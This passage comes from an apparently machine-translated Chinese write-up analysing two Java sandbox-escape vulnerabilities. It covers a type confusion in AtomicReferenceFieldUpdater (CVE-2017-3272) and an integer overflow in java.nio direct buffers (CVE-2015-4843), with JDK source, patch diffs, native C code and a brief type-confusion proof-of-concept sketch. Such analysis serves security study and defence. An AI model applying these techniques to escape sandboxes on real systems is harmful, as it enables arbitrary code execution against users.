&amp;&amp;</span><br><span class="line"><span class="number">21</span>:       ((cl == <span class="keyword">null</span>) || !isAncestor(cl, ccl))) &#123;</span><br><span class="line"><span class="number">22</span>:       sun.reflect.misc.ReflectUtil.checkPackageAccess(tclass);</span><br><span class="line"><span class="number">23</span>:     &#125;</span><br><span class="line"><span class="number">24</span>:     fieldClass = field.getType();</span><br><span class="line"><span class="number">25</span>:   &#125; <span class="keyword">catch</span> (PrivilegedActionException pae) &#123;</span><br><span class="line"><span class="number">26</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(pae.getException());</span><br><span class="line"><span class="number">27</span>:   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line"><span class="number">28</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(ex);</span><br><span class="line"><span class="number">29</span>:   &#125;</span><br><span class="line"><span class="number">30</span>:</span><br><span class="line"><span class="number">31</span>:   <span class="keyword">if</span> (vclass != fieldClass)</span><br><span class="line"><span class="number">32</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException();</span><br><span class="line"><span class="number">33</span>:</span><br><span class="line"><span class="number">34</span>:   <span class="keyword">if</span> (!Modifier.isVolatile(modifiers))</span><br><span class="line"><span class="number">35</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Must be volatile type"</span>);</span><br><span class="line"><span class="number">36</span>:</span><br><span class="line"><span class="number">37</span>:   <span class="keyword">this</span>.cclass = (Modifier.isProtected(modifiers) &amp;&amp;</span><br><span class="line"><span class="number">38</span>:            caller != tclass) ? caller : <span class="keyword">null</span>;</span><br><span class="line"><span class="number">39</span>:   <span class="keyword">this</span>.tclass = tclass;</span><br><span class="line"><span class="number">40</span>:   <span class="keyword">if</span> (vclass == Object.class)</span><br><span class="line"><span class="number">41</span>:     <span class="keyword">this</span>.vclass = <span class="keyword">null</span>;</span><br><span class="line"><span class="number">42</span>:   <span class="keyword">else</span></span><br><span class="line"><span class="number">43</span>:     <span class="keyword">this</span>.vclass = vclass;</span><br><span class="line"><span class="number">44</span>:   offset = unsafe.objectFieldOffset(field);</span><br><span class="line"><span class="number">45</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　构造函数首先通过反射检索要更新的字段（第12行）。请注意，即使代码没有任何权限，反射调用也会起作用。这是因为调用是在doPrivileged（）块内执行的，该块告诉JVM即使原始调用者具有该权限也允许某些操作（参见第2.4节）。接下来，如果字段具有protected属性并且调用者类与tclass类不同，则调用者存储在cclass中（第37-38行）。请注意，调用者是通过调用Reflection.getCallerClass（）在方法newUpdater（）中设置的。这些行（37-38）很奇怪，因为类调用者可能与类tclass无关。我们将在下面看到这些线是漏洞所在的位置。接下来，构造函数存储tclass，vclass并使用类<em>Unsafe</em>的引用unsafe来获取字段的偏移量（第39-44行）。这是一个红旗，因为<em>Unsafe</em>类非常危险。它可以用于直接操作Java程序中不可能的内存。如果它直接或间接地掌握在分析师手中，它可以用来绕过Java沙箱。<br>　　一旦分析师引用了<em>AtomicReferenceFieldUpdater</em>对象，他就可以调用它上面的set（）方法来更新字段，如下图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T obj, V newValue)</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:   accessCheck(obj);</span><br><span class="line"> <span class="number">3</span>:   valueCheck(newValue);</span><br><span class="line"> <span class="number">4</span>:    U.putObjectVolatile(obj, offset, newValue);</span><br><span class="line"> <span class="number">5</span>: &#125;</span><br><span class="line"> <span class="number">6</span>:</span><br><span class="line"> <span class="number">7</span>: <span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">accessCheck</span><span class="params">(T obj)</span> </span>&#123;</span><br><span class="line"> <span class="number">8</span>:   <span class="keyword">if</span> (!cclass.isInstance(obj))</span><br><span class="line"> <span class="number">9</span>:     throwAccessCheckException(obj);</span><br><span class="line"><span class="number">10</span>: &#125;</span><br><span class="line"><span class="number">11</span>:</span><br><span class="line"><span class="number">12</span>: <span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">valueCheck</span><span class="params">(V v)</span> </span>&#123;</span><br><span class="line"><span class="number">13</span>:   <span class="keyword">if</span> (v != <span class="keyword">null</span> &amp;&amp; !(vclass.isInstance(v)))</span><br><span class="line"><span class="number">14</span>:     throwCCE();</span><br><span class="line"><span class="number">15</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　set（）的第一个参数obj是必须更新引用字段的实例。第二个参数newValue是参考字段的新值。首先，set（）检查obj是cclass类型的实例（第2行，第7-10行）。然后，set（）检查newValue为null或vclass的实例，表示字段类型（第3,12-15行）。如果所有检查都通过，则<em>Unsafe</em>类用于将新值放在对象obj中的右偏移处（第4行）。<br>　　该漏洞的补丁如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- this.cclass = (Modifier.isProtected(modifiers))</span><br><span class="line">-                ? caller : tclass;</span><br><span class="line">+ this.cclass = (Modifier.isProtected(modifiers)</span><br><span class="line">+             &amp;&amp; tclass.isAssignableFrom(caller)</span><br><span class="line">+             &amp;&amp; !isSamePackage(tclass, caller))</span><br><span class="line">+                ? caller : tclass;</span><br></pre></td></tr></table></figure><p>　　正如我们之前注意到的那样，原始代码没有对调用者对象执行足够的检查。在修补版本中，代码现在检查tclass是与调用者的超类还是超级接口相同的类。如何利用此漏洞变得显而易见，如下所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="class"><span class="keyword">class</span> <span class="title">Dummy</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:   <span class="keyword">protected</span> <span class="keyword">volatile</span> A f;</span><br><span class="line"> <span class="number">3</span>: &#125;</span><br><span class="line"> <span class="number">4</span>:</span><br><span class="line"> <span class="number">5</span>: <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line"> <span class="number">6</span>:   <span class="keyword">protected</span> <span class="keyword">volatile</span> B g;</span><br><span class="line"> <span class="number">7</span>:</span><br><span class="line"> <span class="number">8</span>:   main() &#123;</span><br><span class="line"> <span class="number">9</span>:     m = <span class="keyword">new</span> MyClass();</span><br><span class="line"><span class="number">10</span>:     u = newUpdater(Dummy.class, A.class, <span class="string">"f"</span>);</span><br><span class="line"><span class="number">11</span>:     u.set(m, <span class="keyword">new</span> A());</span><br><span class="line"><span class="number">12</span>:     println(m.g.getClass());</span><br><span class="line"><span class="number">13</span>:   &#125;</span><br><span class="line"><span class="number">14</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　首先，类型为_A_的字段f的类<em>Dummy</em>用于调用newUpdater（）（第1-3,9,10行）。然后，在更新程序实例（第11行）上使用类<em>MyClass</em>调用方法set（），并为类型_A_的字段f调用新值newVal。而不是具有_A_类型的字段f，<em>MyClass</em>具有类型_B_的字段g。因此，调用set（）之后的实际g类型是_A_，但虚拟机假定类型为_B_。println（）调用将打印“A类”而不是“B类”（第12行）。但是，访问类_A_的这个实例是通过类_B_的方法和字段完成的。</p><h5 id="3-1-3-讨论"><a href="#3-1-3-讨论" class="headerlink" title="3.1.3 讨论"></a>3.1.3 讨论</h5><p>　　如上所述，<em>Atomic * FieldUpdater</em>类已经在Java 1.5中引入。但是，该漏洞仅在版本1.8_112中检测到，并在下一版本1.8_121中进行了修补。通过在1.6_到1.8_112版本中的二分法搜索，我们发现该漏洞首次出现在1.8_92版本中。进一步的测试表明，其间的所有版本都是易受攻击的：1.8_101,1.8_102和1.8_111。我们还针对Java 1.5的第一个和最后一个版本测试了PoC：它们不容易受到攻击。<br>　　版本1.8_91（不易受攻击）和1.8_92（易受攻击）之间的<em>AtomicReferenceFieldUpdater</em>差异表明代码重构操作无法保留对输入值执行的所有检查的语义。版本1.8_91的非易受攻击代码如下所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureProtectedAccess</span><span class="params">(T obj)</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:   <span class="keyword">if</span> (cclass.isInstance(obj)) &#123;</span><br><span class="line"> <span class="number">3</span>:     <span class="keyword">return</span>;</span><br><span class="line"> <span class="number">4</span>:   &#125;</span><br><span class="line"> <span class="number">5</span>:   <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(...</span><br><span class="line"> <span class="number">6</span>: &#125;</span><br><span class="line"> <span class="number">7</span>:</span><br><span class="line"> <span class="number">8</span>: <span class="function"><span class="keyword">void</span> <span class="title">updateCheck</span><span class="params">(T obj, V update)</span> </span>&#123;</span><br><span class="line"> <span class="number">9</span>:   <span class="keyword">if</span> (!tclass.isInstance(obj) ||</span><br><span class="line"><span class="number">10</span>:       (update != <span class="keyword">null</span> &amp;&amp; vclass != <span class="keyword">null</span></span><br><span class="line"><span class="number">11</span>:        &amp;&amp; !vclass.isInstance(update)))</span><br><span class="line"><span class="number">12</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException();</span><br><span class="line"><span class="number">13</span>:   <span class="keyword">if</span> (cclass != <span class="keyword">null</span>)</span><br><span class="line"><span class="number">14</span>:     ensureProtectedAccess(obj);</span><br><span class="line"><span class="number">15</span>: &#125;</span><br><span class="line"><span class="number">16</span>:</span><br><span class="line"><span class="number">17</span>: <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T obj, V newValue)</span> </span>&#123;</span><br><span class="line"><span class="number">18</span>:   <span class="keyword">if</span> (obj == <span class="keyword">null</span> ||</span><br><span class="line"><span class="number">19</span>:       obj.getClass() != tclass ||</span><br><span class="line"><span class="number">20</span>:       cclass != <span class="keyword">null</span> ||</span><br><span class="line"><span class="number">21</span>:       (newValue != <span class="keyword">null</span></span><br><span class="line"><span class="number">22</span>:        &amp;&amp; vclass != <span class="keyword">null</span></span><br><span class="line"><span class="number">23</span>:        &amp;&amp; vclass != newValue.getClass()))</span><br><span class="line"><span class="number">24</span>:       updateCheck(obj, newValue);</span><br><span class="line"><span class="number">25</span>:   unsafe.putObjectVolatile(obj, offset, newValue);</span><br><span class="line"><span class="number">26</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　在非易受攻击版本中，如果obj的类型与tclass不同，包含要更新的字段的类的类型，则可能有两个条件要传递。第一个是obj可以转换为tclass（第9,12行）。第二个，只检查字段是否受保护，是obj可以转换为cclass（第14,16行）。<br>　　但是，在易受攻击的版本中，条件就是obj可以转换为cclass。obj可以转换为tclass的条件丢失了。缺少单个条件就足以创建一个安全漏洞，如果利用得当，将导致完全绕过Java沙箱。<br>　　可以预防类型混乱攻击吗？ 在Java中，出于性能原因，每次使用对象o时都不会检查对象o的类型_T_。在每次使用对象时检查类型将防止类型混淆攻击，但也会引起运行时开销。</p><h4 id="3-2-整数溢出"><a href="#3-2-整数溢出" class="headerlink" title="3.2 整数溢出"></a>3.2 整数溢出</h4><h5 id="3-2-1-背景"><a href="#3-2-1-背景" class="headerlink" title="3.2.1 背景"></a>3.2.1 背景</h5><p>　　当算术运算的结果太大而不适合变量的位数时，就会发生整数溢出。在Java中，整数使用32位来表示带符号的数字。正值具有从0x00000000（0）到0x7FFFFFFF（2 ^ 31-1）的值。负值的值为0x80000000（-2 ^ 31）到0xFFFFFFFF（-1）。如果值0x7FFFFFFF（2 ^ 31-1）递增，则结果不表示2 ^ 31但是（-2 ^ 31）。如何使用它来禁用安全管理器？<br>　　在下一节中，我们将分析CVE-2015-4843的整数溢出。整数用作数组中的索引。使用溢出，我们可以读取/写入数组外的值。这些读/写原语用于实现类型混淆攻击。读者已经从上面对CVE-2017-3272的描述中了解到，分析师可以依靠这样的攻击来禁用安全管理器。</p><h5 id="3-2-2-示例：CVE-2015-4843"><a href="#3-2-2-示例：CVE-2015-4843" class="headerlink" title="3.2.2 示例：CVE-2015-4843"></a>3.2.2 示例：CVE-2015-4843</h5><p>　　Redhat的Bugzilla提供了此漏洞的简短描述。它表明在java.nio包中的Buffers类中发现了多个整数溢出，并且该漏洞可用于执行任意代码。<br>　　漏洞补丁实际上修复了文件java / nio / Direct-X-Buffer.java.template，用于生成DirectXBufferY.java形式的类，其中X可以是“Byte”，“Char”，“Double”，“Int”，“长”，“浮动”或“短”，Y可以是“S”，“U”，“RS”或“RU”。“S”表示该数组包含带符号的数字，“U”无符号数，只读模式下的“RS”有符号数和只读模式下的“RU”无符号数。每个生成的类_C_包装一个可以通过类_C_的方法操作的特定类型的数组。例如，DirectIntBufferS.java包装一个32位有符号整数的数组，并将方法get（）和set（）分别定义为将数组中的元素复制到DirectIntBufferS类的内部数组，或者将内部数组中的元素复制到类外的数组。以下是漏洞补丁的摘录：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14</span>:      <span class="function"><span class="keyword">public</span> $Type$Buffer <span class="title">put</span><span class="params">($type$[] src, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">15:  #if[rw]</span><br><span class="line"><span class="number">16</span>: -        <span class="keyword">if</span> ((length &lt;&lt; $LG_BYTES_PER_VALUE$)</span><br><span class="line">               &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) &#123;</span><br><span class="line"><span class="number">17</span>: +        <span class="keyword">if</span> (((<span class="keyword">long</span>)length &lt;&lt; $LG_BYTES_PER_VALUE$)</span><br><span class="line">               &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) &#123;</span><br><span class="line"><span class="number">18</span>:              checkBounds(offset, length, src.length);</span><br><span class="line"><span class="number">19</span>:              <span class="keyword">int</span> pos = position();</span><br><span class="line"><span class="number">20</span>:              <span class="keyword">int</span> lim = limit();</span><br><span class="line"><span class="number">21</span>: @@ -<span class="number">364</span>,<span class="number">12</span> +<span class="number">364</span>,<span class="number">16</span> @@</span><br><span class="line"><span class="number">22</span>:</span><br><span class="line">23:  #if[!byte]</span><br><span class="line"><span class="number">24</span>:              <span class="keyword">if</span> (order() != ByteOrder.nativeOrder())</span><br><span class="line"><span class="number">25</span>: -                Bits.copyFrom$Memtype$Array(src,</span><br><span class="line">                       offset &lt;&lt; $LG_BYTES_PER_VALUE$,</span><br><span class="line"><span class="number">26</span>: -                  ix(pos), length &lt;&lt; $LG_BYTES_PER_VALUE$);</span><br><span class="line"><span class="number">27</span>: +                Bits.copyFrom$Memtype$Array(src,</span><br><span class="line"><span class="number">28</span>: +                  (<span class="keyword">long</span>)offset &lt;&lt; $LG_BYTES_PER_VALUE$,</span><br><span class="line"><span class="number">29</span>: +                  ix(pos),</span><br><span class="line"><span class="number">30</span>: +                  (<span class="keyword">long</span>)length &lt;&lt; $LG_BYTES_PER_VALUE$);</span><br><span class="line"><span class="number">31</span>:              <span class="keyword">else</span></span><br><span class="line">32:  #end[!byte]</span><br><span class="line"><span class="number">33</span>: -                Bits.copyFromArray(src, arrayBaseOffset,</span><br><span class="line">                       offset &lt;&lt; $LG_BYTES_PER_VALUE$,</span><br><span class="line"><span class="number">34</span>: -                  ix(pos), length &lt;&lt; $LG_BYTES_PER_VALUE$);</span><br><span class="line"><span class="number">35</span>: +                Bits.copyFromArray(src, arrayBaseOffset,</span><br><span class="line"><span class="number">36</span>: +                  (<span class="keyword">long</span>)offset &lt;&lt; $LG_BYTES_PER_VALUE$,</span><br><span class="line"><span class="number">37</span>: +                  ix(pos),</span><br><span class="line"><span class="number">38</span>: +                  (<span class="keyword">long</span>)length &lt;&lt; $LG_BYTES_PER_VALUE$);</span><br><span class="line"><span class="number">39</span>:              position(pos + length);</span><br></pre></td></tr></table></figure><p>　　修复（第17,28,36和38行）包括在执行移位操作之前将32位整数转换为64位整数，该移位操作在32位上可能导致整数溢出。从Java 1.8更新65中从java.nio.DirectIntBufferS.java中提取的put（）方法的更正版本如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">354</span>:     <span class="function"><span class="keyword">public</span> IntBuffer <span class="title">put</span><span class="params">(<span class="keyword">int</span>[] src, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line"><span class="number">355</span>:</span><br><span class="line"><span class="number">356</span>:       <span class="keyword">if</span> (((<span class="keyword">long</span>)length &lt;&lt; <span class="number">2</span>) &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) &#123;</span><br><span class="line"><span class="number">357</span>:             checkBounds(offset, length, src.length);</span><br><span class="line"><span class="number">358</span>:             <span class="keyword">int</span> pos = position();</span><br><span class="line"><span class="number">359</span>:             <span class="keyword">int</span> lim = limit();</span><br><span class="line"><span class="number">360</span>:             <span class="keyword">assert</span> (pos &lt;= lim);</span><br><span class="line"><span class="number">361</span>:             <span class="keyword">int</span> rem = (pos &lt;= lim ? lim - pos : <span class="number">0</span>);</span><br><span class="line"><span class="number">362</span>:             <span class="keyword">if</span> (length &gt; rem)</span><br><span class="line"><span class="number">363</span>:                 <span class="keyword">throw</span> <span class="keyword">new</span> BufferOverflowException();</span><br><span class="line"><span class="number">364</span>:</span><br><span class="line"><span class="number">365</span>:</span><br><span class="line"><span class="number">366</span>:             <span class="keyword">if</span> (order() != ByteOrder.nativeOrder())</span><br><span class="line"><span class="number">367</span>:                 Bits.copyFromIntArray(src,</span><br><span class="line"><span class="number">368</span>:                                             (<span class="keyword">long</span>)offset &lt;&lt; <span class="number">2</span>,</span><br><span class="line"><span class="number">369</span>:                                             ix(pos),</span><br><span class="line"><span class="number">370</span>:                                             (<span class="keyword">long</span>)length &lt;&lt; <span class="number">2</span>);</span><br><span class="line"><span class="number">371</span>:             <span class="keyword">else</span></span><br><span class="line"><span class="number">372</span>:</span><br><span class="line"><span class="number">373</span>:                 Bits.copyFromArray(src, arrayBaseOffset,</span><br><span class="line"><span class="number">374</span>:                                    (<span class="keyword">long</span>)offset &lt;&lt; <span class="number">2</span>,</span><br><span class="line"><span class="number">375</span>:                                    ix(pos),</span><br><span class="line"><span class="number">376</span>:                                    (<span class="keyword">long</span>)length &lt;&lt; <span class="number">2</span>);</span><br><span class="line"><span class="number">377</span>:             position(pos + length);</span><br><span class="line"><span class="number">378</span>:       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">379</span>:             <span class="keyword">super</span>.put(src, offset, length);</span><br><span class="line"><span class="number">380</span>:       &#125;</span><br><span class="line"><span class="number">381</span>:       <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line"><span class="number">382</span>:</span><br><span class="line"><span class="number">383</span>:</span><br><span class="line"><span class="number">384</span>:</span><br><span class="line"><span class="number">385</span>:     &#125;</span><br></pre></td></tr></table></figure><p>　　此方法将src数组中的长度元素从指定的偏移量复制到内部数组。在第367行，调用方法Bits.copyFromIntArray（）。此Java方法将源数组的引用，源数组的偏移量（以字节为单位），以字节为单位的目标数组的索引以及要复制的字节数作为参数。由于最后三个参数表示大小和偏移量（以字节为单位），因此必须将它们乘以4（左侧移位2）。这是针对偏移（线374），pos（线375）和长度（线376）完成的。请注意，对于pos，操作在ix（）方法中完成。<br>　　在易受攻击的版本中，不存在强制转换，这使得代码容易受到整数溢出的影响。<br>　　类似地，将元素从内部数组复制到外部数组的get（）方法也很容易受到攻击。get（）方法与put（）方法非常相似，只是对copyFromIntArray（）的调用被对copyToIntArray（）的调用所取代：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">262</span>:     <span class="function"><span class="keyword">public</span> IntBuffer <span class="title">get</span><span class="params">(<span class="keyword">int</span>[] dst, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line"><span class="number">263</span>:</span><br><span class="line">[...]</span><br><span class="line"><span class="number">275</span>:                 Bits.copyToIntArray(ix(pos), dst,</span><br><span class="line"><span class="number">276</span>:                                           (<span class="keyword">long</span>)offset &lt;&lt; <span class="number">2</span>,</span><br><span class="line"><span class="number">277</span>:                                           (<span class="keyword">long</span>)length &lt;&lt; <span class="number">2</span>);</span><br><span class="line">[...]</span><br><span class="line"><span class="number">291</span>:     &#125;</span><br></pre></td></tr></table></figure><p>　　由于方法get（）和put（）非常相似，因此下面我们仅描述如何在get（）方法中利用整数溢出。put（）方法的方法是相同的。<br>　　让我们看一下在get（）方法中调用的Bits.copyFromArray（）方法。这种方法实际上是一种原生方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">803</span>:    <span class="function"><span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">copyToIntArray</span><span class="params">(<span class="keyword">long</span> srcAddr, Object dst,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">804</span>:                                      <span class="keyword">long</span> dstPos, <span class="keyword">long</span> length)</span></span>;</span><br></pre></td></tr></table></figure><p>　　该方法的C代码如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">175</span>: JNIEXPORT <span class="keyword">void</span> JNICALL</span><br><span class="line"><span class="number">176</span>: Java_java_nio_Bits_copyToIntArray(JNIEnv *env, jobject <span class="keyword">this</span>,</span><br><span class="line"><span class="number">177</span>:                                   jlong srcAddr, jobject dst,</span><br><span class="line">                                      jlong dstPos, jlong length)</span><br><span class="line"><span class="number">178</span>: &#123;</span><br><span class="line"><span class="number">179</span>:     jbyte *bytes;</span><br><span class="line"><span class="number">180</span>:     <span class="keyword">size_t</span> size;</span><br><span class="line"><span class="number">181</span>:     jint *srcInt, *dstInt, *endInt;</span><br><span class="line"><span class="number">182</span>:     jint tmpInt;</span><br><span class="line"><span class="number">183</span>:</span><br><span class="line"><span class="number">184</span>:     srcInt = (jint *)jlong_to_ptr(srcAddr);</span><br><span class="line"><span class="number">185</span>:</span><br><span class="line"><span class="number">186</span>:     <span class="keyword">while</span> (length &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">187</span>:         <span class="comment">/* do not change this code, see WARNING above */</span></span><br><span class="line"><span class="number">188</span>:         <span class="keyword">if</span> (length &gt; MBYTE)</span><br><span class="line"><span class="number">189</span>:             size = MBYTE;</span><br><span class="line"><span class="number">190</span>:         <span class="keyword">else</span></span><br><span class="line"><span class="number">191</span>:             size = (<span class="keyword">size_t</span>)length;</span><br><span class="line"><span class="number">192</span>:</span><br><span class="line"><span class="number">193</span>:         GETCRITICAL(bytes, env, dst);</span><br><span class="line"><span class="number">194</span>:</span><br><span class="line"><span class="number">195</span>:         dstInt = (jint *)(bytes + dstPos);</span><br><span class="line"><span class="number">196</span>:         endInt = srcInt + (size / <span class="keyword">sizeof</span>(jint));</span><br><span class="line"><span class="number">197</span>:         <span class="keyword">while</span> (srcInt &lt; endInt) &#123;</span><br><span class="line"><span class="number">198</span>:             tmpInt = *srcInt++;</span><br><span class="line"><span class="number">199</span>:             *dstInt++ = SWAPINT(tmpInt);</span><br><span class="line"><span class="number">200</span>:         &#125;</span><br><span class="line"><span class="number">201</span>:</span><br><span class="line"><span class="number">202</span>:         RELEASECRITICAL(bytes, env, dst, <span class="number">0</span>);</span><br><span class="line"><span class="number">203</span>:</span><br><span class="line"><span class="number">204</span>:         length -= size;</span><br><span class="line"><span class="number">205</span>:         srcAddr += size;</span><br><span class="line"><span class="number">206</span>:         dstPos += size;</span><br><span class="line"><span class="number">207</span>:     &#125;</span><br><span class="line"><span class="number">208</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　我们注意到没有检查数组索引。如果索引小于零或大于或等于数组大小，则代码也将运行。该代码首先将long转换为32位整数指针（第184行）。然后，代码循环直到长度/大小元素被复制（第186和204行）。对GETCRITICAL（）和RELEASECRITICAL（）（第193和202行）的调用用于同步对dst数组的访问，因此与检查数组的索引无关。<br>　　要执行此本机代码，必须满足get（）Java方法中存在的三个约束：</p><ul><li>约束1：<br><code>356: if (((long)length &lt;&lt; 2) &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) {</code></li><li>约束2：<br><code>357: checkBounds(offset, length, src.length);</code></li><li>约束3：<br><code>362: if (length &gt; rem)</code></li></ul><p>　　我们没有在第360行提及断言，因为只检查是否在VM中设置了“-ea”（启用断言）选项。这在生产中几乎从未出现过，因为它会导致减速。<br>　　在第一个约束中，JNI_COPY_FROM_ARRAY_THRESHOLD表示通过本机代码从中完成复制的阈值（要复制的元素数）。Oracle凭经验确定从6个元素调用本机代码是值得的。要满足此约束，要复制的元素数必须大于1（6 &gt;&gt; 2）。<br>　　第二个约束出现在checkBounds（）方法中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">564</span>:    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkBounds</span><span class="params">(<span class="keyword">int</span> off, <span class="keyword">int</span> len, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line"><span class="number">566</span>:        <span class="keyword">if</span> ((off | len | (off + len) | (size - (off + len))) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">567</span>:            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException();</span><br><span class="line"><span class="number">568</span>:    &#125;</span><br></pre></td></tr></table></figure><p>　　第二个约束可以表示如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:  offset &gt; <span class="number">0</span> AND length &gt; <span class="number">0</span> AND (offset + length) &gt; <span class="number">0</span></span><br><span class="line"><span class="number">2</span>:  AND (dst.length - (offset + length)) &gt; <span class="number">0</span>.</span><br></pre></td></tr></table></figure><p>　　